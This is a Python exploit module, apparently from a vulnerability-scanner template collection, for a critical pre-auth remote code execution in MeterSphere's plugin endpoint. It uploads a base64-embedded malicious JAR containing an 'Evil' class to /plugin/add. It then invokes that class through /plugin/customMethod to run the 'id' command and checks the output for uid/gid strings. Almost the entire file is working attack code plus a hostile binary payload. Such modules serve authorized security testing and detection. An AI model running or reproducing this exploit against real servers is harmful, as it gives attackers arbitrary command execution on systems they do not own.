import requests
import re
import random
import string
import base64


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''MeterSphere Plugin Pre-auth RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://y4er.com/post/metersphere-plugincontroller-pre-auth-rce/", 
            "https://github.com/metersphere/metersphere"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["metersphere", "rce", "intrusive"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    randstr = gen_randstr(10)
    try:
        url = format_url(url)

        path = """/plugin/add"""
        method = "POST"
        data = """------WebKitFormBoundaryreButJNjkCniQExX
Content-Disposition: form-data; name="file"; filename="{randstr}.jar"
Content-Type: application/octet-stream

{payload}
------WebKitFormBoundaryreButJNjkCniQExX
Content-Disposition: form-data; name="request"; filename="blob"
Content-Type: application/json

null
------WebKitFormBoundaryreButJNjkCniQExX--""".format(randstr=randstr, payload=base64.b64decode("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"))
        headers = {'Accept': 'application/json, text/plain, */*', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryreButJNjkCniQExX'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/plugin/customMethod"""
        method = "POST"
        data = {"entry":"Evil","request":"id"}
        headers = {'Content-Type': 'application/json'}
        resp1 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""data":""" in resp1.text and """success":true""" in resp1.text) and (re.search(r"""((u|g)id|groups)=[0-9]{1,4}\([a-z0-9]+\)""",resp1.text)) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url

def gen_randstr(length):
    return ''.join(random.sample(string.ascii_letters + string.digits, length))